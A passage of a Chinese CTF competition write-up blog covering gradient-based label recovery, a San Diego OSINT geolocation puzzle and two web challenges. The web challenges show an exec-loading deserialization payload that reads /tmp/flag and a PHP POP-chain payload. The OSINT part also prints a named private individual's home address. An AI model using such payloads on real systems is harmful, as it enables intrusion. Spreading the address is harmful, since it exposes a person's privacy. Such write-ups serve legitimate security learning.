></p>\n<p>数据处理的比较乱。。。</p>\n<p>恢复出来发现并不是顺序可读的flag。</p>\n<p>想到了用时间判断梯度生成的先后，结果发现精确到毫秒级所有样本都是一模一样的。然后问ai说可以通过损失判断训练的先后，因为损失一般是收敛的，但并没有观察出什么规律。又莫名其妙发现.grad可以解压，有个serialization_id，还以为和梯度顺序有关，但其实只是训练设备的标号。最后才知道顺序和标签有关——</p>\n<p>（又重新训了一遍数据看标签的值）</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 6. 输出恢复标签</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">    final_probs = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">    recovered_class = torch.argmax(final_probs, dim=-<span class=\"number\">1</span>).item()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Recovered class label:&quot;</span>, recovered_class)</span><br></pre></td></tr></table></figure></div>\n<p>这个标签代表了梯度的顺序。</p>\n<p>需要注意的是，如果迭代时损失比较大，可能就不能使标签收敛到正确的值。所以也需要再调整迭代次数重新训练。</p>\n<p>因为数据处理的比较乱，则列了一个表格记录标签值</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504224517508.png\"\n                      alt=\"image-20250504224517508\"\n                ></p>\n<p>最后一个样本在恢复标签值时始终找不到合适的迭代次数，但好在通过标签值排序后已经恢复出了flag的大意：R1ck likes ai security，所以便没有重新训练该样本。</p>\n<p>历经千辛万苦得到了flag：</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;R1ck_iik35_41_53cur17y&#125;</span><br></pre></td></tr></table></figure></div>\n<p>虽然课没好好上，但是通过这次ai安全的题目感觉把之前欠的都补回来了。</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>在比赛中的成长只有靠写WP才能沉淀。但是太拖延了几乎比完赛才开始动笔写。</p>\n<p>虽然只能做做简单题，但是能坚持在五一打比赛已经很了不起了😭😭👍</p>\n<p>相比去年只做出一道题，今年进步也算不小了，虽然有不少的功劳出自ai和出题人。（出题人们真的好强，真是学到了不少东西）</p>\n<p>感谢队友的鼎力相助，看到队友能挑战pwn题和hard题——仰慕.jpg</p>\n<p>比赛过的很快，五一也过得很快。是时候该补作业了。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>压线过二等。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"list.png\"\n                      alt=\"alt text\"\n                ></p>\n","more":"<h1 id=\"OSINT\"><a href=\"#OSINT\" class=\"headerlink\" title=\"OSINT\"></a>OSINT</h1><p>非常好玩的图寻题，但充分暴露出地理常识为0。幸运地抢了个三血。</p>\n<h2 id=\"海的那边是\"><a href=\"#海的那边是\" class=\"headerlink\" title=\"海的那边是\"></a>海的那边是</h2><p>POV：<strong>羡慕出题人在海边度假</strong></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193131.jpg\"\n                      alt=\"alt text\"\n                ></p>\n<p>因为对出题人在群里说正在San Diego的印象比较深，马上定位图片位置大概就是La Jolla。</p>\n<h3 id=\"task1\"><a href=\"#task1\" class=\"headerlink\" title=\"task1\"></a>task1</h3><p>保存图片后查看图片属性</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250503175742770.png\"\n                      alt=\"alt text\"\n                ><br>ans：<u><strong>20250427</strong></u></p>\n<h3 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193419.png\"\n                      alt=\"alt text\"\n                ></p>\n<p>先定位到建筑的位置会更方便做剩下几问，于是打开谷歌识图：<br>发现了一模一样的建筑，连水管和猫头鹰装饰都一模一样！</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193140.png\"\n                      alt=\"alt text\"\n                ></p>\n<p>打开作者主页：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193150.png\"\n                      alt=\"微信图片_20250503193150\"\n                ></p>\n<p>其他图片显示的内容也佐证了这一点，<u>在海边</u>。</p>\n<p>本来想在谷歌地图里面暴走一圈找到这个建筑来着，但是太暴力了点。</p>\n<p>又想去其他社交平台找这个作者，但是没什么发现。不过意外发现了这个作者的住址：<strong><em>Jeremiah Regner, located at 9505 Gold Coast Dr Apt 98, San Diego, CA</em>.</strong></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193205.png\"\n                      alt=\"微信图片_20250503193205\"\n                ></p>\n<p>地点极其符合——在谷歌地图定位这个地址：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193217.jpg\"\n                      alt=\"微信图片_20250503193217\"\n                ></p>\n<p>先在作者家附近的海岸找，果然找到了：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193223.png\"\n                      alt=\"微信图片_20250503193223\"\n                ></p>\n<p>在地图上走啊走，就走到了：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503194002.png\"\n                      alt=\"微信图片_20250503194002\"\n                ></p>\n<p>ans：<u><strong>Hubbs Hall</strong></u></p>\n<h3 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p>谷歌地图上是有充电头信息的，但是找不到，绷🤣</p>\n<p>不过好在有很多充电桩分布的网站提供信息。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503194142.png\"\n                      alt=\"微信图片_20250503194142\"\n                ></p>\n<p>ans：<u><strong>J1772</strong></u></p>\n<h3 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>ez，随便找个出发点，最后都要坐30路公交。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503194610.png\"\n                      alt=\"微信图片_20250503194610\"\n                ></p>\n<p>ans：<u><strong>30</strong></u></p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>Hubbs Hall旁边的潮汐监测点在 Sccripps Pier，其站点编号是9410230。</p>\n<p>找到相关数据网站就有了。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503195311.png\"\n                      alt=\"微信图片_20250503195311\"\n                ></p>\n<p>图中数据即是5月7号的海浪预测峰值</p>\n<p>p.s.：因为这里死活填不对，拷打了下出题人，出题人说可以ft转cm可以先舍去小数部分再计算，4ft算出来四舍五入是122，但是正确答案是121🥲。（原来保留整数就真的只是保留整数（部分）。。）</p>\n<p>以及不同网站的预测数据不太一样，有点搞……</p>\n<p>ans：<u><strong>122 or 143</strong></u></p>\n<h3 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p>不学地理是这样的，☝️🤓可以算出海浪峰值周期40000多秒。</p>\n<p>找到现成的数据就好了：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503200140.png\"\n                      alt=\"微信图片_20250503200140\"\n                ></p>\n<p>ans：<u><strong>10</strong></u></p>\n<h3 id=\"flag\"><a href=\"#flag\" class=\"headerlink\" title=\"flag\"></a>flag</h3><p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503200530.png\"\n                      alt=\"微信图片_20250503200530\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;Sc1ENc3_UndOUBTEd1Y_IMMorT4I_5EA_Un4R9U481y_IlLumln4tlnG&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"Core-Dump-Error（签到题）\"><a href=\"#Core-Dump-Error（签到题）\" class=\"headerlink\" title=\"Core Dump Error（签到题）\"></a>Core Dump Error（签到题）</h2><p>半夜误打误撞做出来了。</p>\n<p>原来视频里面的issue只是被close而不是被delete了 hhh。</p>\n<p>只要找到相关issue的POC链然后改一下exec执行的命令就好了</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;objects&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;1&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;frame&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;attrs&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_lineno&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;11&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_locals&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;12&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_code&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;13&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_globals&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;14&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_back&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;15&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;11&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;int&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;12&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;dict&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;13&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;code&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;attrs&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;co_filename&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;131&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;co_name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;132&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;14&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;dict&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;141&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;143&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;142&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;144&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;15&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;NoneType&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;131&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;filename&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;132&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;name&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;141&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;__name__&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;142&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;__loader__&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;143&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;print(open(&#x27;/tmp/flag&#x27;).read())&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;144&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EvilLoader&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;attrs&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;get_source&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;1441&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;1441&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;builtin_function&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;exec&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;threads&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;0&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;frame&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;current_thread&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;0&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;files&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;metadata&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;0.4.0&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250505110938.png\"\n                      alt=\"微信图片_20250505110938\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;c0N9ra7u1ATIonS_0N_hacK1nG_A_pRoGraM_foR_TH3_1IrSt_t1Me&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Happy-PHP\"><a href=\"#Happy-PHP\" class=\"headerlink\" title=\"Happy PHP\"></a>Happy PHP</h2><h3 id=\"part1\"><a href=\"#part1\" class=\"headerlink\" title=\"part1\"></a>part1</h3><p>阅读php代码，梳理逻辑如下：</p>\n<ul>\n<li>如果url中传递了参数  gogogo ，该对象就会被反序列化。</li>\n<li>反序列化的对象会触发魔术方法__wakeup()，并返回gogogo的结果。</li>\n<li><p>如果触发phpis 类的__invoke()方法，则执行fun1(fun2())，并通过eval()函数执行代码。返回结果 == ‘Yelia’的话，就调用 what-&gt;saying。</p>\n</li>\n<li><p>要调用piece1-&gt;here()，必须让 $flag 的 MD5 值等于 md5(666)。</p>\n</li>\n<li><p>如果两个不同的变量 $sy 和 $su 的 MD5 和 SHA1相等，就能echo fl491.txt。</p>\n</li>\n</ul>\n<p>通过构造反序列化的POP链，获得payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">phpis</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$what</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$fun1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$fun2</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class=\"variable\">$this</span>-&gt;fun1) )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class=\"variable\">$this</span>-&gt;fun2)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$flag</span> = <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;return <span class=\"subst\">$this</span>-&gt;fun1(<span class=\"subst\">$this</span>-&gt;fun2());&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$flag</span>) == <span class=\"string\">&#x27;Yelia&#x27;</span>)&#123;</span><br><span class=\"line\">                    <span class=\"variable language_\">$this</span>-&gt;what-&gt;<span class=\"title function_ invoke__\">saying</span>();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;nonono ,please try again !!&quot;</span>);</span><br><span class=\"line\">                &#125;            </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">thebest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$gogogo</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">language</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$v1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$piece1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">right</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$sy</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$su</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$right</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">right</span>();</span><br><span class=\"line\"><span class=\"variable\">$right</span>-&gt;sy = [<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"variable\">$right</span>-&gt;su = [<span class=\"number\">2</span>]; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$lang</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">language</span>();</span><br><span class=\"line\"><span class=\"variable\">$lang</span>-&gt;v1 = <span class=\"string\">&quot;flag=&quot;</span> . <span class=\"title function_ invoke__\">md5</span>(<span class=\"number\">666</span>);</span><br><span class=\"line\"><span class=\"variable\">$lang</span>-&gt;piece1 = <span class=\"variable\">$right</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phpis</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">phpis</span>();</span><br><span class=\"line\"><span class=\"variable\">$phpis</span>-&gt;what = <span class=\"variable\">$lang</span>;</span><br><span class=\"line\"><span class=\"variable\">$phpis</span>-&gt;fun1 = <span class=\"string\">&quot;strlen&quot;</span>; </span><br><span class=\"line\"><span class=\"variable\">$phpis</span>-&gt;fun2 = <span class=\"string\">&quot;strrev&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$best</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">thebest</span>();</span><br><span class=\"line\"><span class=\"variable\">$best</span>-&gt;gogogo = <span class=\"variable\">$phpis</span>;</span><br><span 